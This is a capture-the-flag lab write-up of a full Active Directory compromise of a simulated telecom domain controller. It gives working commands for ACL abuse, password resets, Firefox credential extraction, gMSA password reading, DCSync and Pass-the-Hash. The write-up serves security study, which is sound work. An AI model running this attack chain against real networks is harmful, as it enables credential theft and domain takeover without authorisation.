# StellarComms | Writeups

## Scenario

### Objective / Scope

Stellar Communications, a regional telecommunications provider, has retained the Hack Smarter Red Team to conduct a covert internal network penetration test. The client is concerned about the resilience of their internal Active Directory infrastructure against insider threats and compromised VPN endpoints.

Your objective is to simulate a compromised remote worker, pivot through the internal network, and demonstrate the ability to compromise high-value targets (HVTs) without triggering the Blue Team's SOC alerts.

### Initial Access

Our initial access team has successfully established a VPN tunnel into the environment. We have identified a valid username, likely belonging to a new hire or junior staff member.

* **Valid User:**
  * **Username:** `junior.analyst`
  * **Password:** _Unknown_

## Summary

In StellarComms we begin as a simulated remote worker with VPN access and an identified username, `junior.analyst`. Enumeration of the domain controller `DC-STELLAR` reveals an exposed FTP service containing onboarding documents that disclose default passwords. Using these, we authenticate as `junior.analyst` and perform BloodHound enumeration, discovering a misconfigured ACL allowing `WriteOwner` over the `stellar-ops_control` group. Abusing this, we gain full control of the group and reset the password of `ops.controller`, achieving remote access via WinRM. From this foothold, we extract Firefox credentials from local profiles, revealing the password of `astro.researcher`. With this account, we leverage a `WriteDACL` privilege over `eng.payload` to reset its password, and from there, read the managed password of the gMSA account `satlink-service$`. Since this account has `DCSync` rights, we replicate domain credentials and recover the NT hash of the Administrator account. Using Pass-the-Hash via WinRM, we log in as Domain Admin and retrieve the final flag.

## Recon

We use rustscan `-b 500 -a 10.1.129.141 -- -sC -sV -Pn` to enumerate all TCP ports on the `stellarcomms` machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

```bash
rustscan -b 500 -a 10.1.129.141 -- -sC -sV -Pn
```

![](../../../.gitbook/assets/image)

The `stellarcomms` machine is actually a domain controller with exposed services including FTP `21` allowing anonymour login, DNS `53`, Kerberos `88/464`, an `IIS /10.0` web server on port `80`, multiple MSRPC endpoints `135, 593, 49664+`, SMB `139/445`, LDAP and LDAPS `389/636/3268/3269` tied to Active Directory, RDP `3389`, and .NET Remoting `9389`. This indicates a fully integrated Windows AD environment where LDAP/LDAPS and Kerberos provide authentication, SMB and RPC enable remote management, and RDP/WinRM serve as remote access points.

![](<../../../.gitbook/assets/image (1)>)

![](<../../../.gitbook/assets/image (2)>)

## FTP

We start with the FTP service and gain access via `anonymous` login.

Here we find documents in the `Docs` folder. Among other things, we find something that could refer to onboarding documents: `Stellar_UserGuide.pdf`.

![](<../../../.gitbook/assets/image (3)>)

We download every file and inspect each. It turns out that `Stellar_UserGuide.pdf` is for real an on-boarding document. Among other things, it contains default credentials a default password for testing purposes. We note that down.

![](<../../../.gitbook/assets/image (4)>)

## WEB

For now, we'll continue and take a look at the website hosted via the IIS. It appears to be a purely static site. We find a contact form, but it doesn't seem to be functional.

At the gallery we find some Pictures. In the metadata of the pictures, we find the artist and creator who is the provided user from the scenario.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FcI9EMnaZK7SHOzpfeAOc%252Fgrafik.png%3Falt%3Dmedia%26token%3D75ba398f-ccd8-4f9e-bc8c-aefc8d73dd84\&width=768\&dpr=3\&quality=100\&sign=6fe83b9a\&sv=2)

## SMB

Before we dive in with the credentials of the on-boarding document and the provided user we try to authenticate as `guest` and anonymously against SMB, but without success. Nevertheless we generate the hosts file entry like the following

```bash
nxc smb 10.1.129.141 -u '' -p ''  --generate-hosts-file hosts
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FQQbO8K8XoteNBEaMFZF6%252Fgrafik.png%3Falt%3Dmedia%26token%3D4c7681b5-67fd-472a-9e5a-4baef2641554\&width=768\&dpr=3\&quality=100\&sign=f7d6f655\&sv=2)

We add the following to our `/etc/hosts` file. We could also directly append the entry to our hosts file by providing the path to `/etc/hosts` in the NetExec command.

```
10.1.129.141     DC-STELLAR.stellarcomms.local stellarcomms.local DC-STELLAR
```

## Access as junior.analyst

We test whether the `junior.analyst` user is using the default password. To do this, we use NetExec to authenticate ourselves to SMB as `junior.analyst`. We are successful. However, we do not find any special shares.

We could enumerate further users from here, but we will skip this and enumerate the domain using BloodHound, since we now have access as the user `junior.analyst`.

```bash
nxc smb DC-STELLAR.stellarcomms.local -u 'junior.analyst' -p 'REDACTED' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FrAirajTTfAQ2OqgbJ4nc%252Fgrafik.png%3Falt%3Dmedia%26token%3D37c00bfc-fa05-4866-aee2-10d3c35773c8\&width=768\&dpr=3\&quality=100\&sign=43dad30b\&sv=2)

## BloodHound Enumeration

We enumerate the AD using BloodHound.

```bash
bloodhound-ce.py --zip -c All -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' -dc DC-STELLAR.stellarcomms.local -ns 10.1.129.141
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FJh1WOnXpdTAfsFrTBEsS%252Fgrafik.png%3Falt%3Dmedia%26token%3D9905e704-dced-4a34-8726-f428e15b2d8b\&width=768\&dpr=3\&quality=100\&sign=558f6611\&sv=2)

We identify the Domain Admin.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FWON51RS0HUngoGprpNHF%252Fgrafik.png%3Falt%3Dmedia%26token%3Da5fa43a3-dd8c-4459-8d30-aa5678a2f992\&width=768\&dpr=3\&quality=100\&sign=c15226f8\&sv=2)

And we see that the user junior.analyst has WriteOwner permission to the `stellar-ops_control` group.

This would allow us to set ourselves as the owner of the group, then set `GenericAll` to the group, so that we can add ourselves as the user `junior.analyst` and thus gain the permissions of the group and move laterally. But first, let's see what the group can do.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FB7JRHf76pEq5DroTJQL5%252Fgrafik.png%3Falt%3Dmedia%26token%3De9a84ac1-0981-4a90-99fb-6fae1f16fa0e\&width=768\&dpr=3\&quality=100\&sign=d2882cf8\&sv=2)

We query for the `Shortest Path from Owned objects`. We see that we can move laterally via our `WriteOwner` over the `stellar-ops_control` group, from there we can change the password of the user `ops.controller` via the ForceChangePassword permission. With that resulting user we can gain initial foothold, since the user is in the `remote management users` group.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FvH7TfwDGgwos5KfsVjln%252Fgrafik.png%3Falt%3Dmedia%26token%3D959f2b53-c7d1-4c90-9de0-9cdd098b6563\&width=768\&dpr=3\&quality=100\&sign=1db31a45\&sv=2)

Furthermore we query for the `Shortest Path to Domain Admins`. We observe that we can move laterally via the `WriteDacl` permission of the `astro.researcher` user over `eng.payload`, allowing us to grant ourselves access to read the `gMSA password` of `satlink.services`. From there, we can authenticate as `satlink.services`, which has `DC Sync` privileges, which allows us to simulate the replication process from the domain controller. This leads to the compromise of the credential material on the domain controller.

However, we also see that there is no path from `junior.analyst` to `astro.researcher`. So we need to make sure that we escalate from our foothold on to `astro.researcher` in order to fully compromise the domain controller.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FFAXmxGXpntpEsyO7DNDm%252Fgrafik.png%3Falt%3Dmedia%26token%3Dcfcf35fb-ac42-478d-8bea-67ea0c588dac\&width=768\&dpr=3\&quality=100\&sign=2a0f7c9\&sv=2)

## Shell as ops.controller

We first pursue our enumerated attack path from our Bloodhound enumeration and escalate from `junior.analyst` to `ops.controller` to gain initial foothold on the domain controller.

Recalling the results form the enumeration:

> We query for the `Shortest Path from Owned objects`. We see that we can move laterally via our `WriteOwner` over the `stellar-ops_control` group, from there we can change the password of the user `ops.controller` via the ForceChangePassword permission. With that resulting user we can gain initial foothold, since the user is in the `remote management users` group.

First we need to add `junior.analyst` to the `stellar-ops_control` group.

> And we see that the user junior.analyst has WriteOwner permission to the `stellar-ops_control` group.
>
> This would allow us to set ourselves as the owner of the group, then set `GenericAll` to the group, so that we can add ourselves as the user `junior.analyst` and thus gain the permissions of the group and move laterally. But first, let's see what the group can do.

**WriteOwner -> change ourself to owner**

We change the ownership of the target Active Directory object `stellarops-control` to our controlled account `junior.analyst` so we gain full control over it.

[Grant ownership | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/grant-ownership#grant-ownership)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner $TargetObject $ControlledPrincipal
```

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' set owner 'stellarops-control' 'junior.analyst'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FRHzxnZ1bbbTEoG4OexPu%252Fgrafik.png%3Falt%3Dmedia%26token%3D144d6edc-7847-4f73-a50b-d78439046d0f\&width=768\&dpr=3\&quality=100\&sign=94838dd5\&sv=2)

**Grant us GenericAll over the Group**

We grant the account `junior.analyst``GenericAll` permissions over the target group `stellarops-control`, giving us full control over the object and its attributes.

[Grant rights | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)

```bash
# Give full control (with inheritance to the child object if applicable)
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"
```

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' add genericAll 'stellarops-control' "junior.analyst"
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FsEEkFO3nWvFJODFpPPVg%252Fgrafik.png%3Falt%3Dmedia%26token%3D23a14776-70d8-4d3c-a8bf-8ec437f364e0\&width=768\&dpr=3\&quality=100\&sign=be80a5b8\&sv=2)

**AddMember: Add junior.analyst to the group**

We add the account `junior.analyst` as a member of the `stellarops-control` group to inherit its privileges.

This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights` or `Self-Membership`, over the target group.

[AddMember | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/addmember)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TargetGroup" "$TargetUser"
```

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' add groupMember 'stellarops-control' 'junior.analyst'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FOx6dvJIKsapgz3w6t89J%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd1e1ad4d-3e4e-467e-b9d8-c6ef1f78348a\&width=768\&dpr=3\&quality=100\&sign=a9e5596d\&sv=2)

**ForceChangePassword**

We reset the password of the `ops.controller` account to a known value, allowing us to authenticate as that user.

[ForceChangePassword | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'junior.analyst' -p 'REDACTED' set password 'ops.controller' 'Pwned123@!'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Fi6YLLnxP9MEYiwtvd1in%252Fgrafik.png%3Falt%3Dmedia%26token%3Da28c8fe7-7b77-4ad9-9d51-9886f0afc741\&width=768\&dpr=3\&quality=100\&sign=e8bb5c4f\&sv=2)

We test the credentials using NetExec and are able to authenticate against SMB on `DC-STELLAR`.

```bash
nxc smb DC-STELLAR.stellarcomms.local -u 'ops.controller' -p 'Pwned123@!' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F9xAKTxxEHTObJ1cAxIPU%252Fgrafik.png%3Falt%3Dmedia%26token%3D9c06a708-8fe2-4fe8-be3c-700ad937c39d\&width=768\&dpr=3\&quality=100\&sign=dfd07b3d\&sv=2)

Next, we get an interactive session using evil-winrm and are able to connect. We find the user flag at `C:\Users\ops.controller\Desktop\user.txt`.

```bash
evil-winrm -i DC-STELLAR.stellarcomms.local -u 'ops.controller' -p 'Pwned123@!'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FuLWkeuzqNTAZSfobPNCx%252Fgrafik.png%3Falt%3Dmedia%26token%3D949d0311-b5e3-4b8c-bf8b-a2de3dcaf095\&width=768\&dpr=3\&quality=100\&sign=f7ff6d40\&sv=2)

## Access as astro.researcher

On the Desktop of `ops.controller` we find an installer for Firefox 91.0 esr next to the flag. What we could try now is to extract the browser credentials.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FPXs2MvAPsJFsREhHUssc%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd66d4b87-1bcc-4922-b34d-d4df1b3492dc\&width=768\&dpr=3\&quality=100\&sign=e5ac668e\&sv=2)

There is also an interesting article on this topic that goes into detail about various browsers.

[Decrypting Browser Credentials For Fun (But Not Profit)\_Apr4h](https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/)

What we need in the end is a `logins.json` and a `key4.db` file to decrypt the credentials of a firefox profile.

> **Where are the creds stored?**
>
> Users’ Firefox profiles are each stored in their own directory under `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\`. In recent versions of Firefox, there are two relevant artefacts required for decryption of stored credentials.
>
> * `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\key4.db`
> * `C:\Users\Apr4h\Roaming\Mozilla\Firefox\Profiles\<random text>.default\logins.json`

We find the following two profiles: `67wyvfsfs.default` and `v8mn7ijj.default-esr`.

```
C:\Users\ops.controller\APPDATA\Roaming\Mozilla\Firefox\profiles
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Flv2gpRnDts8hB9g6k4gB%252Fgrafik.png%3Falt%3Dmedia%26token%3D3b6e6cfc-95c1-4328-a194-665a909d3d69\&width=768\&dpr=3\&quality=100\&sign=e5a4fd0c\&sv=2)

Of which `v8mn7ijj.default-esr...`

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Fu044SeucPhC9QFMo19No%252Fgrafik.png%3Falt%3Dmedia%26token%3D5032dd83-f682-4973-b6b5-5ed386eeaeaa\&width=768\&dpr=3\&quality=100\&sign=2ec6d073\&sv=2)

is not empty, we download both required files:

```bash
download key4.db
```

```bash
download logins.json
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Fd3N4dlVxEmUctFndTpzZ%252Fgrafik.png%3Falt%3Dmedia%26token%3D6d7fdee5-dc36-419b-94a1-bcd9f976e9ba\&width=768\&dpr=3\&quality=100\&sign=a29bab81\&sv=2)

To extract the credentials from the files we can make use of the following project called `firepwd`:

[GitHub - lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwords](https://github.com/lclevy/firepwd)

We try to decrypt the credentials contained in the `v8mn7ijj.default-esr` (the folder contains both files) and find the credentials of `astro.reaseacher`.

```bash
python firepwd/firepwd-ng.py -d v8mn7ijj.default-esr
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F6VvdpVqfdHdnLUmYF1vY%252Fgrafik.png%3Falt%3Dmedia%26token%3D805e3b8f-1372-462b-ae94-2857c5993397\&width=768\&dpr=3\&quality=100\&sign=7c11919d\&sv=2)

We test the credentials using NetExec and are able to authenticate against SMB on `DC-STELLAR`.

```bash
nxc smb DC-STELLAR.stellarcomms.local -u 'astro.researcher' -p 'REDACTED' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F6KaWAHzKltGhIIvmZgVc%252Fgrafik.png%3Falt%3Dmedia%26token%3Dfbd8fd8d-e1a1-43d4-aecf-417808756c91\&width=768\&dpr=3\&quality=100\&sign=a4e39644\&sv=2)

Recalling our BloodHound enumeration, we can now follow the attack path starting from `astro.researcher` to completely compromise the domain controller.

> Furthermore we query for the `Shortest Path to Domain Admins`. We observe that we can move laterally via the `WriteDacl` permission of the `astro.researcher` user over `eng.payload`, allowing us to grant ourselves access to read the `gMSA password` of `satlink.services`. From there, we can authenticate as `satlink.services`, which has `DC Sync` privileges, which allows us to simulate the replication process from the domain controller. This leads to the compromise of the credential material on the domain controller.
>
> However, we also see that there is no path from `junior.analyst` to `astro.researcher`. So we need to make sure that we escalate from our foothold on to `astro.researcher` in order to fully compromise the domain controller.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FeM0zmoEO2mbKQwunSKq6%252Fgrafik.png%3Falt%3Dmedia%26token%3Dafe422c7-2fe6-481b-bdcd-9171fba61e9e\&width=768\&dpr=3\&quality=100\&sign=b13091b2\&sv=2)

## Access as eng.payload

**Grant us GenericAll over the eng.payload**

We grant the account `astro.researcher``GenericAll` permissions over the `eng.payload` user, giving us full control to modify it as needed.

[Grant rights | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)

```bash
# Give full control (with inheritance to the child object if applicable)
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"
```

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'astro.researcher' -p 'REDACTED' add genericAll 'eng.payload' 'astro.researcher'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F12UWv7UTHrDARpJxU6Zp%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd34cf754-89c5-475e-af35-0e601084b7ac\&width=768\&dpr=3\&quality=100\&sign=6411d9cd\&sv=2)

**ForceChangePassword**

Now we reset the password of the `eng.payload`, since we have `GenericAll` permissions over that.

[ForceChangePassword | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'astro.researcher' -p 'REDACTED' set password 'eng.payload' 'Pwned123@!'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FkTyqPXkNQPQIsFN3SWPZ%252Fgrafik.png%3Falt%3Dmedia%26token%3D6ed72b79-ec62-4ecd-b8cf-f1dbbdd7fb18\&width=768\&dpr=3\&quality=100\&sign=f4c9d0df\&sv=2)

We test the credentials using NetExec and are able to authenticate against SMB on `DC-STELLAR`.

```bash
nxc smb DC-STELLAR.stellarcomms.local -u 'eng.payload' -p 'Pwned123@!' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FsV9iZ9zjt94Ickkb9jzJ%252Fgrafik.png%3Falt%3Dmedia%26token%3Df0cd2f84-bda2-4697-97c9-1e8cd79ab1f2\&width=768\&dpr=3\&quality=100\&sign=624e37bd\&sv=2)

## Access as satlink-services

**ReadGMSAPassword**

We read the managed password of the gMSA account `satlink-service$` by querying its `msDS-ManagedPassword` attribute using our authorized access via `eng.payload`.

[ReadGMSAPassword | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword#readgmsapassword)

> This abuse stands out a bit from other abuse cases. It can be carried out when controlling an object that has enough permissions listed in the target gMSA account's `msDS-GroupMSAMembership` attribute's DACL. Usually, these objects are principals that were configured to be explictly allowed to use the gMSA account.
>
> The attacker can then read the gMSA (group managed service accounts) password of the account if those requirements are met.

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword
```

We retrive the NT hash of `satlink-service$`.

```bash
bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local -u 'eng.payload' -p 'Pwned123@!' get object 'satlink-service$' --attr msDS-ManagedPassword
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FqNDSDpNPDjOBFiZnl7BQ%252Fgrafik.png%3Falt%3Dmedia%26token%3Dc4eb111b-228a-4c68-86fd-e8065197ce48\&width=768\&dpr=3\&quality=100\&sign=53717076\&sv=2)

We test the hash using NetExec and are able to authenticate against SMB on `DC-STELLAR`.

```bash
nxc smb DC-STELLAR.stellarcomms.local -u 'satlink-service$' -H 'REDACTED' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FyK62QLCmMczWNkKYp1Tp%252Fgrafik.png%3Falt%3Dmedia%26token%3D1a87a796-b75a-4187-8fad-133b7b51ed28\&width=768\&dpr=3\&quality=100\&sign=e008fb19\&sv=2)

## Shell as Domain Administrator

Now that we have access as `satlink-service$` we can perform the DCSync attack.

[DCSync | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync#dcsync)

> DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. This attack can lead to the compromise of major credential material such as the Kerberos `krbtgt` keys used legitimately for tickets creation, but also for [tickets forgingarrow-up-right](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/index) by attackers. The consequences of this attack are similar to an [NTDS.dit dump and parsingarrow-up-right](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds) but the practical aspect differ. A DCSync is not a simple copy & parse of the NTDS.dit file, it's a `DsGetNCChanges` operation transported in an RPC request to the DRSUAPI (Directory Replication Service API) to replicate data (including credentials) from a domain controller.

```bash
# with Pass-the-Hash
secretsdump -outputfile 'dcsync' -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"@"$DC_HOST"
```

We perform the secretsdump and are able to retrieve the NT hash of the Domain Admin among others.

```bash
secretsdump -outputfile 'dcsync' -hashes :'REDACTED' -dc-ip DC-STELLAR.stellarcomms.local 'stellarcomms.local/satlink-service$@DC-STELLAR.stellarcomms.local'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FRgPP17F4hF6KNgDAjJeU%252Fgrafik.png%3Falt%3Dmedia%26token%3D295db32a-f97d-4651-8365-90b2af736cb9\&width=768\&dpr=3\&quality=100\&sign=97d05a2a\&sv=2)

We log in as the Domain Admin using the retrieved hash via evil-winrm. We find the final flag at `C:\Users\Administrator\Desktop\root.txt`.

```bash
evil-winrm -i DC-STELLAR.stellarcomms.local -u 'Administrator' -H 'REDACTED'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FVLfbmPkmRr73UniLqcMQ%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd5c88e19-322a-4bfe-8aaf-cb29ebde74c8\&width=768\&dpr=3\&quality=100\&sign=14d3fbcd\&sv=2)
